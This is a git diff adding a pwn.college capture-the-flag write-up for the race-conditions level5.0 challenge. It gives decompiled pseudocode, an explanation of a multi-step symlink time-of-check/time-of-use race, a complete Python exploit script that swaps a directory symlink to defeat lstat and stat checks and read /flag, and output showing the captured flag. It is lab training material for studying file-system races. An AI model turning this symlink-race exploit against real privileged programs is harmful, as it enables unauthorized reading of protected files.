@@ -1344,3 +1344,276 @@ Error: file is a symlink!
 You win! Here is your flag:
 pwn.college{8mY5J_7CMeMw0isLBN2GRaR5HoX.0FOwQDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## level5.0
+
+> Exploit a complex race condition to read the flag. This race condition involves multiple steps, which makes it less reliable to exploit!
+
+```text
+hacker@race-conditions~level5-0:~$ /challenge/babyrace_level5.0
+###
+### Welcome to /challenge/babyrace_level5.0!
+###
+
+Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
+you to open a single file, as specified by the first argument to the program (argv[1]).
+
+The file opened will be be sent to you.
+
+This challenge will verify that the file's path does not include "flag".
+This challenge will verify that the file is not a symlink.
+This challenge will verify that the directory the file is in is owned by root
+and that other users are not able to create files in that directory.
+babyrace_level5.0: <stdin>:76: main: Assertion `argc > 1' failed.
+Aborted
+```
+
+The program performs four checks before opening the file:
+
+1. The path must not contain the string `"flag"`.
+2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
+3. The directory containing the file must be owned by root (`stat` → `st_uid == 0`).
+4. The directory must not be group owned by non-root and must not be world-writable (`st_gid == 0`, `st_mode & 2 == 0`).
+
+### Source code analysis
+
+```c title="/challenge/babyrace_level5.0 :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char *v3; // rax
+  char *v4; // rax
+  int v5; // eax
+  size_t v6; // rax
+  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
+  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
+  unsigned __int64 v10; // [rsp+1B8h] [rbp-8h]
+
+  v10 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows");
+  puts("you to open a single file, as specified by the first argument to the program (argv[1]).\n");
+  puts("The file opened will be be sent to you.\n");
+  puts("This challenge will verify that the file's path does not include \"flag\".");
+  puts("This challenge will verify that the file is not a symlink.");
+  puts("This challenge will verify that the directory the file is in is owned by root");
+  puts("and that other users are not able to create files in that directory.");
+  if ( argc <= 1 )
+    __assert_fail("argc > 1", "<stdin>", 0x31u, "main");
+  if ( strstr(argv[1], "flag") )
+  {
+    puts("Error: path contains `flag`!");
+    exit(1);
+  }
+  puts("Calling lstat (does not follow symlinks) on the path.\n");
+  puts("Paused (press enter to continue)");
+  getchar();
+  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
+  {
+    puts("Error: failed to get file status!");
+    exit(1);
+  }
+  if ( (stat_buf.st_mode & 0xF000) == 40960 )
+  {
+    puts("Error: file is a symlink!");
+    exit(1);
+  }
+  puts("Calling stat (follows symlinks) on the directory.\n");
+  puts("Paused (press enter to continue)");
+  getchar();
+  v3 = strdup(argv[1]);
+  v4 = dirname(v3);
+  if ( (unsigned int)stat(v4, &stat_buf) == -1 )
+  {
+    puts("Error: failed to get directory status!");
+    exit(1);
+  }
+  if ( stat_buf.st_uid )
+  {
+    puts("Error: directory not owned by root!");
+    exit(1);
+  }
+  if ( stat_buf.st_gid )
+  {
+    puts("Error: directory not group owned by root!");
+    exit(1);
+  }
+  if ( (stat_buf.st_mode & 2) != 0 )
+  {
+    puts("Error: other users are able to write in this directory!");
+    exit(1);
+  }
+  puts("Paused (press enter to continue)");
+  getchar();
+  v5 = open(argv[1], 0);
+  v6 = read(v5, buf, 0x100uLL);
+  write(1, buf, v6);
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+There are now **three pauses** creating two distinct race windows:
+
+```text
+Pause 1 → lstat(file)        → checks file is not a symlink
+Pause 2 → stat(directory)    → checks dir is root-owned, no world-write
+Pause 3 → open(file)         → reads and outputs the file
+```
+
+The directory check uses `stat()` which **follows symlinks** — so we can pass a symlink to a root-owned directory and it will follow it and check the target. This is the key: we don't need to own a root-owned directory, we just need to **point at one** when the check runs.
+
+We pass the path `d/x` where `d` is a symlink we control, and swap it between three states across the three pauses:
+
+```text
+Pause 1: d -> /home/hacker, x = real file
+         lstat("d/x") sees real file -> not a symlink ✓
+
+Pause 2: d -> /etc
+         dirname("d/x") = "d" -> stat("d") -> stat("/etc")
+         /etc is root-owned, no world-write ✓
+
+Pause 3: d -> /home/hacker, x = symlink to /flag
+         open("d/x") = open("/home/hacker/x") = open(/flag) -> reads flag ✓
+```
+
+Note that `lstat` only checks the **final component** of the path for being a symlink — intermediate directory symlinks like `d` are followed freely. This is why swapping `d` does not trigger the symlink check.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+import subprocess, time, os, warnings
+warnings.filterwarnings("ignore")
+
+# Setup
+os.system("rm -f /home/hacker/x && echo hi > /home/hacker/x")
+
+print("[*] Starting exploit loop...")
+attempt = 0
+proc = None
+
+while True:
+    attempt += 1
+
+    # Explicitly clean up previous process
+    if proc is not None:
+        try:
+            proc.stdin.close()
+        except Exception:
+            pass
+        try:
+            proc.stdout.close()
+        except Exception:
+            pass
+        try:
+            proc.kill()
+        except Exception:
+            pass
+        try:
+            proc.wait()
+        except Exception:
+            pass
+        proc = None
+
+    # Reset x to real file each attempt
+    os.system("rm -f /home/hacker/x && echo hi > /home/hacker/x")
+
+    try:
+        os.remove("d")
+    except FileNotFoundError:
+        pass
+    os.symlink("/home/hacker", "d")
+
+    proc = subprocess.Popen(
+        ["/challenge/babyrace_level5.0", "d/x"],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        close_fds=True
+    )
+
+    # Pause 1: lstat sees d/x = real file -> passes symlink check
+    time.sleep(0.1)
+    try:
+        proc.stdin.write(b"\n")
+        proc.stdin.flush()
+    except Exception:
+        continue
+
+    # Swap d -> /etc so stat(dirname("d/x")) = stat(/etc) = root-owned, no world-write
+    try:
+        os.remove("d")
+    except FileNotFoundError:
+        pass
+    os.symlink("/etc", "d")
+
+    # Pause 2: stat sees /etc -> passes directory ownership check
+    time.sleep(0.05)
+    try:
+        proc.stdin.write(b"\n")
+        proc.stdin.flush()
+    except Exception:
+        continue
+
+    # Swap d back to home, swap x to symlink -> open() reads /flag
+    try:
+        os.remove("d")
+    except FileNotFoundError:
+        pass
+    os.symlink("/home/hacker", "d")
+    os.system("rm -f /home/hacker/x && ln -s /flag /home/hacker/x")
+
+    # Pause 3: open(d/x) = open(/home/hacker/x) = open(/flag)
+    time.sleep(0.05)
+    try:
+        proc.stdin.write(b"\n")
+        proc.stdin.flush()
+        proc.stdin.close()
+    except Exception:
+        continue
+
+    out = proc.stdout.read()
+    proc.wait()
+    proc = None
+
+    if attempt % 10 == 0:
+        print(f"[*] Attempt {attempt}...")
+
+    if attempt <= 3:
+        print(f"[DBG] {out.decode(errors='replace')[-300:]}")
+
+    if b"pwn.college" in out:
+        print("[+] Got the flag!")
+        print(out.decode(errors='replace'))
+        break
+```
+
+```text
+hacker@race-conditions~level5-0:~$ python3 ~/script.py
+[*] Starting exploit loop...
+[+] Got the flag!
+###
+### Welcome to /challenge/babyrace_level5.0!
+###
+Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
+you to open a single file, as specified by the first argument to the program (argv[1]).
+The file opened will be be sent to you.
+This challenge will verify that the file's path does not include "flag".
+This challenge will verify that the file is not a symlink.
+This challenge will verify that the directory the file is in is owned by root
+and that other users are not able to create files in that directory.
+Calling lstat (does not follow symlinks) on the path.
+Paused (press enter to continue)
+Calling stat (follows symlinks) on the directory.
+Paused (press enter to continue)
+Paused (press enter to continue)
+pwn.college{gXKlwRMMcYar5h7AewIEIbhmQyx.0VOwQDL4ITM0EzW}
+### Goodbye!
+```
